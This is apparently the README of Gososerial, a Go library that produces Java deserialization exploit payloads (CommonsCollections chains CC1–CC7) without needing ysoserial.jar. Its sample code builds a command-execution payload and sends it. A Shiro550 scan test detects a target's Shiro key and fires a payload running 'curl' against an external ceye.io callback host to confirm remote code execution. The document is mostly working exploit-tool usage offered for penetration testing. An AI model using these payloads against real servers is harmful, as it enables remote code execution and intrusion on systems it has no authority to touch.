# Gososerial

## Introduce

- Ysoserial is a well-known tool for Java deserialization security

- No Java environment and no need to download ysoserial.jar file

- Enter the command to directly obtain the payload, which is convenient for writing security tools

## Quick Start

```shell
go get github.com/JimmyWA/Gososerial
```

```go
package main

import gososerial "github.com/JimmyWA/gososerial"

func main()  {
	payload := gososerial.GetCC1("calc.exe")
	......
	sendPayload(payload)
	......
}
```

Shiro550 Scan Code

```go
......
func TestFindShiro(t *testing.T) {
	target := "http://a.b.c.d:8080/"
	key := shiro.CheckShiroKey(target)
	if key != "" {
		log.Info("find key: %s", key)
	}
	payload := gososerial.GetCC5("curl xxxxx.ceye.io")
	shiro.SendPayload(key, payload, target)
}
......
```

## Reference

**4ra1n**: https://github.com/4ra1n

**ysoserial**: https://github.com/frohoff/ysoserial

**xray**: https://github.com/chaitin/xray

**phith0n**: https://github.com/phith0n


## Appendix
这个仓库的起因是4ra1n师傅的gososerial年久失修(?)，于是在github找到了一个备份仓库，新建了一个自用，方便自己维护。该仓库目前只有CC1~CC7的利用链，在jboss环境中测试了CC5，其他还未测试。之后可能会根据需要继续添加其他利用链。